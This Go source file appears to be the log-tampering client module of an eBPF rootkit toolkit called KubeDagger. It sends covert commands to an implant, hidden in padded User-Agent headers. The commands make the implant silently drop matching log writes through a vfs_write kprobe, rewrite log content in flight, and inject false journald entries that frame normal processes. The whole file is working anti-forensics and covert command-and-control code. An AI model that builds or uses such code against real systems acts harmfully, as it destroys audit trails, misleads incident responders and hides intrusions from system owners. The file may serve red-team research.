package log_tamper

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type LogTamperResult struct {
	Mode    string       `json:"mode"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, mode, pattern, logTarget, output string) error {
	var result *LogTamperResult

	switch mode {
	case "drop":
		result = dropLogs(target, pattern, logTarget)
	case "modify":
		result = modifyLogs(target, pattern, logTarget)
	case "inject":
		result = injectLogs(target, pattern, logTarget)
	default:
		return fmt.Errorf("unsupported mode: %s (use drop, modify, or inject)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func dropLogs(target, pattern, logTarget string) *LogTamperResult {
	result := &LogTamperResult{Mode: "drop"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"install_vfs_write_hook",
			"kprobe on vfs_write to intercept log writes before they reach disk",
			"logtamper_hook_vfs_write",
		},
		{
			"configure_drop_pattern",
			"load pattern into BPF map for matching and dropping log entries",
			"logtamper_set_drop_pattern",
		},
		{
			"suppress_matching_entries",
			"silently drop write calls whose content matches the configured pattern",
			"logtamper_enable_drop",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pattern + "#" + logTarget
		status := sendLogTamperCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func modifyLogs(target, pattern, logTarget string) *LogTamperResult {
	result := &LogTamperResult{Mode: "modify"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"install_write_intercept",
			"kprobe on vfs_write with bpf_probe_write_user for in-flight modification",
			"logtamper_hook_modify",
		},
		{
			"configure_rewrite_rules",
			"set pattern match and replacement strings in BPF map",
			"logtamper_set_rewrite",
		},
		{
			"enable_inline_modification",
			"activate real-time log content rewriting before write completes",
			"logtamper_enable_modify",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pattern + "#" + logTarget
		status := sendLogTamperCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func injectLogs(target, pattern, logTarget string) *LogTamperResult {
	result := &LogTamperResult{Mode: "inject"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_journal_write",
			"intercept journald socket writes to inject decoy entries",
			"logtamper_hook_journal",
		},
		{
			"inject_false_entries",
			"write false log entries that implicate normal processes as suspicious",
			"logtamper_inject_entries",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pattern + "#" + logTarget
		status := sendLogTamperCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func sendLogTamperCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/log_tamper", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
